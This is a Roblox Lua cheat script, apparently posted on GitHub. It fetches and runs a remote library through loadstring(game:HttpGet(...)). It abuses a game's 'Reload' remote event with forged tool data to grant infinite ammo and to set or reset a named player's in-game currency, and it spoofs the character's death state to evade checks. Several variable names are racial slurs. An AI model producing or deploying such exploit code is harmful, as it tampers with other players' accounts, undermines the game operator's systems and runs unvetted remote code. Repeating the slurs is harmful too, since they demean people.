-- // Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/IntelDevHub/Intel/main/000193.txt"))()
-- // Window
local Window = Library:Window("Florin", "Untitled Fucker", Enum.KeyCode.v)

-- // Tab

local Tab = Window:Tab("Cash")

local Workspace = game:GetService("Workspace")
local Players = game.Players.LocalPlayer

local Character = Players.Character

function Buy(Object)
    local Object = Object
    local LockPicker = Workspace.Ignored.Shop[Object]
    Character.HumanoidRootPart.CFrame = LockPicker.Head.CFrame + Vector3.new(0, 3, 0)
    wait(0.5)
    fireclickdetector(LockPicker.ClickDetector)
    fireclickdetector(LockPicker.ClickDetector)
end

Buy("[Revolver] - $1300")

wait(0.5)

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]", --// reminder: [Double-Barrel SG] or [Revolver] works for any gun but i put it here so i can just copy and paste whenever i want to
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = {Value = math.huge*9e9},
        MaxAmmo = {Value = 0},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
)

wait(2)

local nigger = game:GetService('Players').LocalPlayer
        local Nigger2 = nigger.Character
        Nigger2:FindFirstChildOfClass('Humanoid'):Destroy()
        local shitCharacter = nigger.CharacterAdded:Wait()
        local spoofFolder = Instance.new('Folder')
        spoofFolder.Name = 'FULLY_LOADED_CHAR'
        spoofFolder.Parent = shitCharacter
        shitCharacter:WaitForChild('BodyEffects').Dead:Destroy()
        shitCharacter:WaitForChild('BodyEffects').BreakingParts:Destroy()
        local spoofValue = Instance.new('BoolValue', shitCharacter.BodyEffects)
        spoofValue.Name = 'Dead'
        wait(1)
        nigger.Character:WaitForChild('Humanoid'):WaitForChild('BodyWidthScale').Value = 0.5


_G.Aiden = "AnthonyKirk44"

_G.Amount = 9999999999999999
---

_G.Reset = 1 

Tab:Button("Give everyones cash", function()

    game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
        "Reload",
        {
            Name = "[Revolver]",
            Parent = Game.Players.LocalPlayer.Backpack,
            ClassName = "Tool",
            Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Currency,
            MaxAmmo = {Value = _G.Amount},
            GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
            Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
        }
    ) 
end)   

Tab:Button("Reset everyones cash", function()

   game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
        "Reload",
        {
            Name = "[Revolver]",
            Parent = Game.Players.LocalPlayer.Backpack,
            ClassName = "Tool",
            Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Currency,
            MaxAmmo = {Value = _G.Reset},
            GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
            Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
        }
    ) 
    end)
end)
© 2022 GitHub, Inc.
